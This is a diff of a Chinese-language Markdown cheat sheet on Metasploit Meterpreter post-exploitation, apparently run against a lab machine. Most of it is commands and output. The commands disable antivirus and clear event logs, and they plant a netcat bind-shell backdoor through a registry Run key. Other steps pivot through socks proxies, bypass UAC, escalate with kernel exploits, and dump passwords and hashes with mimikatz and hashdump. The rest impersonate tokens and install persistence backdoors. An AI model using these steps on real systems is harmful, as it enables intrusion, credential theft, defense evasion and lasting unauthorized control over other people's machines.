@@ -1,5 +1,7 @@
 # meterpreter命令
 
+
+
 首先需要先获取meterpreter：
 
 ```bash
@@ -14,6 +16,8 @@ sessions -l  # (查看会话)
 sessions -i 2   # 选择会话
 sessions -k 2   # 结束会话
 ```
+
+如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用`sessions-u 2`来将cmdshell升级成meterpreter。
 
 获取到了meterpreter，就可以进行后渗透了。
 
@@ -75,6 +79,18 @@ run post/windows/manage/enable_rdp  #开启远程桌面
 run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户
 run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662
 
+# 关闭防病毒软件
+run killav
+run post/windows/manage/killav
+
+# 修改注册表
+reg –h # 注册表命令帮助
+upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc
+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe' #设置键值
+reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值
+nc -v 192.168.81.162 443  #攻击者连接nc后门
+
 # 清理日志
 clearav  #清除windows中的应用程序日志、系统日志、安全日志
 ```
@@ -123,13 +139,17 @@ run arp_scanner -r 192.168.2.0/24
 run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24
 run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0
 
-# Socks4a代理
-# autoroute添加完路由后，还可以利用msf自带的sock4a模块进行Socks4a代理
+# autoroute添加完路由后，还可以利用msf自带的模块进行socks代理
+# msf提供了3个模块用来做socks代理。
+# auxiliary/server/socks4a
+# use auxiliary/server/socks5
+# use auxiliary/server/socks_unc
 # 先background退出来，然后：
 use auxiliary/server/socks4a 
 set srvhost 127.0.0.1
 set srvport 1080
 run
+
 # 然后vi /etc/proxychains.conf #添加 socks4 127.0.0.1 1080
 # 最后proxychains 使用Socks4a代理访问
 
@@ -168,15 +188,31 @@ run post/windows/gather/enum_domain  #查找域控
 getsystem
 ```
 
-2.bypassuac
+2.bypassuac 用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。
+
+msf提供了如下几个模块帮助绕过UAC：
 
 ```bash
-# 内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限
-# use exploit/windows/local/bypassuac
-# use exploit/windows/local/bypassuac_injection
-# use windows/local/bypassuac_vbs
-# use windows/local/ask
+msf5 auxiliary(server/socks5) > search bypassuac
 
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
+   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
+   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
+   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
+   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
+   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
+   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
+   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
+```
+
+使用方法类似，运行后返回一个新的会话，**需要再次执行getsystem获取系统权限**
+
+```bash
 # 示例
 meterpreter > getuid
 Server username: SAUCERMAN\TideSec
@@ -201,11 +237,13 @@ msf5 exploit(windows/local/bypassuac) > run
 [-] Exploit failed [timeout-expired]: Timeout::Error execution expired
 [*] Exploit completed, but no session was created.
 
-# 然后返回新的meterpreter会话，继续getsystem
+# 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功
 # 然鹅这里失败了
 ```
 
 3.内核漏洞提权
+
+无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。
 
 ```bash
 meterpreter > run post/windows/gather/enum_patches  #查看补丁信息
@@ -249,7 +287,11 @@ msf5 exploit(windows/local/ms13_081_track_popup_menu) > exploit
 # 然鹅失败了，摸摸头
 ```
 
-#### 6 mimikatz抓取密码
+#### 6 获取凭证
+
+在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。
+
+1.使用mimikatz
 
 ```bash
 load mimikatz    #help mimikatz 查看帮助
@@ -292,27 +334,75 @@ meterpreter > mimikatz_command -f sekurlsa::searchPasswords
 [5] { TideSec ; SAUCERMAN ; 123456 }
 ```
 
-#### 7 Hash利用
+1. 使用meterpreter的run hashdump命令
 
 ```bash
-# 从SAM导出密码哈希需要SYSTEM权限
-run post/windows/gather/smart_hashdump  
+meterpreter > run hashdump
 
-# PSExec哈希传递
-# 通过smart_hashdump获取用户哈希后，可以利用psexec模块进行哈希传递攻击
-# 前提条件：①开启445端口 smb服务；②开启admin$共享
-msf5 > use exploit/windows/smb/psexec
-msf5 > set payload windows/meterpreter/reverse_tcp
-msf5 > set LHOST 192.168.159.134
-msf5 > set LPORT 443
-msf5 > set RHOST 192.168.159.144
-msf5 >set SMBUser Administrator
-msf5 >set SMBPass aad3b4*****04ee:5b5f00*****c424c
-msf5 >set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain
-msf5 >exploit
+[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
+[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
+[*] Dumping password hints...
+
+TideSec:"123456"
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
 ```
 
-#### 8 假冒令牌
+3.post/windows/gather/smart\_hashdump
+
+从上面也可以看出官方推荐`post/windows/gather/smart_hashdump`
+
+```bash
+meterpreter > run post/windows/gather/smart_hashdump
+
+[*] Running module against SAUCERMAN
+[*] Hashes will be saved to the database if one is connected.
+[+] Hashes will be saved in loot in JtR password file format to:
+[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt
+[*] Dumping password hashes...
+[*] Running as SYSTEM extracting hashes from registry
+[*]     Obtaining the boot key...
+[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
+[*]     Obtaining the user list and keys...
+[*]     Decrypting user keys...
+[*]     Dumping password hints...
+[+]     TideSec:"123456"
+[*]     Dumping password hashes...
+[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+```
+
+4.powerdump 同 hashdump，但失败了
+
+```bash
+meterpreter > run powerdump
+[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...
+[*] Running PowerDump to extract Username and Password Hashes...
+[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...
+[*] Setting ExecutionPolicy to Unrestricted...
+[*] Dumping the SAM database through PowerShell...
+
+[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.
+```
+
+#### 7 假冒令牌
+
+在用户登录windows操作系统时，系统都会给用户分配一个令牌\(Token\)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。
+
+msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。
 
 ```bash
 # 1.incognito假冒令牌
@@ -329,13 +419,15 @@ steal_token <pid值>   #从指定进程中窃取token   先ps
 drop_token  #删除窃取的token
 ```
 
-#### 9 植入后门
+#### 8 植入后门
 
 Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。
 
 1.persistence启动项后门
 
-在C:\Users_\*_\AppData\Local\Temp\目录下，上传一个vbs脚本，在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项
+路径：metasploit/scripts/meterpreter/persistence
+
+原理是在`C:\Users***\AppData\Local\Temp\`目录下，上传一个vbs脚本，在注册表`HKLM\Software\Microsoft\Windows\CurrentVersion\Run\`加入开机启动项，**很容易被杀软拦截，官方不推荐**
 
 ```bash
 run persistence –h  #查看帮助
@@ -357,9 +449,11 @@ meterpreter > run persistence -X -i 5 -p 4444 -r 192.168.81.160
 [+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua
 ```
 
+能实现同样功能的脚本还有：exploit/windows/local/persistence
+
 2.metsvc服务后门
 
-在C:\Users_\*_\AppData\Local\Temp\目录下，上传一个vbs脚本 在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项
+在C:\Users**\*\AppData\Local\Temp\目录下，上传一个vbs脚本 在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。**通过服务启动，需要管理员权限，官方不推荐使用，运行失败\*\*
 
 ```bash
 run metsvc –A   #自动安装后门
@@ -388,16 +482,128 @@ Mode              Size    Type  Last modified              Name
 100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe
 ```
 
-3.注册表后门
+三个文件上传成功，但服务没有启动起来，失败了。使用`-r`参数可卸载服务。
+
+3.persistence\_exe
+
+再来看看官方推荐的东西吧
 
 ```bash
-reg –h # 注册表命令帮助
+meterpreter > info post/windows/manage/persistence_exe
 
-upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc
-reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key
-reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe' #设置键值
-reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值
+       Name: Windows Manage Persistent EXE Payload Installer
+     Module: post/windows/manage/persistence_exe
+   Platform: Windows
+       Arch: 
+       Rank: Normal
 
-nc -v 192.168.81.162 443  #攻击者连接nc后门
+Provided by:
+  Merlyn drforbin Cousins <drforbin6@gmail.com>
+
+Compatible session types:
+  Meterpreter
+
+Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  REXENAME  default.exe      yes       The name to call exe on remote system
+  REXEPATH                   yes       The remote executable to upload and execute.
+  SESSION                    yes       The session to run this module on.
+  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)
+
+Description:
+  This Module will upload an executable to a remote host and make it 
+  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER 
+  will start on user login, SYSTEM will start on system boot but 
+  requires privs. SERVICE will create a new service which will start 
+  the payload. Again requires privs.
+
+
+
+Module options (post/windows/manage/persistence_exe):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   REXENAME  default.exe      yes       The name to call exe on remote system
+   REXEPATH                   yes       The remote executable to upload and execute.
+   SESSION                    yes       The session to run this module on.
+   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)
 ```
+
+此模块将可执行文件上载到远程主机并进行创建持久性。 涉及到四个参数
+
+* REXENAME是拷贝到目标系统中的名字
+* EXEPATH是将要上传的后门在本地的位置
+* SESSION是选择运行此模块的会话
+* STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动\(需要权限\)，SERVICE表示将创建一个启动服务项\(需要权限\)。
+
+尝试一下：
+
+```bash
+meterpreter > run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER
+
+[*] Running module against SAUCERMAN
+[*] Reading Payload from file /home/ubuntu/shell.exe
+[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe
+[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe
+[+] Agent executed with PID 3684
+[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI
+[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI
+[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc
+```
+
+4.registry\_persistence
+
+完整路径为exploit/windows/local/registry\_persistence
+
+和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。
+
+```bash
+meterpreter > background
+[*] Backgrounding session 13...
+msf5 auxiliary(server/socks5) > use exploit/windows/local/registry_persistence
+msf5 exploit(windows/local/registry_persistence) > show options
+
+Module options (exploit/windows/local/registry_persistence):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)
+   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)
+   CREATE_RC      true             no        Create a resource file for cleanup
+   RUN_NAME                        no        The name to use for the 'Run' key. (Default: random)
+   SESSION                         yes       The session to run this module on.
+   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)
+   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(windows/local/registry_persistence) > set SESSION 13
+SESSION => 13
+msf5 exploit(windows/local/registry_persistence) > run
+
+[*] Generating payload blob..
+[+] Generated payload, 6048 bytes
+[*] Root path is HKCU
+[*] Installing payload blob..
+[+] Created registry key HKCU\Software\0BaG3zDR
+[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD
+[*] Installing run key
+[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB
+[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc
+```
+
+同类型的还有其他payload，如exploit/windows/local/vss\_persistence，exploit/windows/local/s4u\_persistence。
+
+### 参考
+
+* [https://xz.aliyun.com/t/2536](https://xz.aliyun.com/t/2536)
+* [https://www.anquanke.com/post/id/164525](https://www.anquanke.com/post/id/164525)
+* [https://www.freebuf.com/sectool/118714.html](https://www.freebuf.com/sectool/118714.html)
 
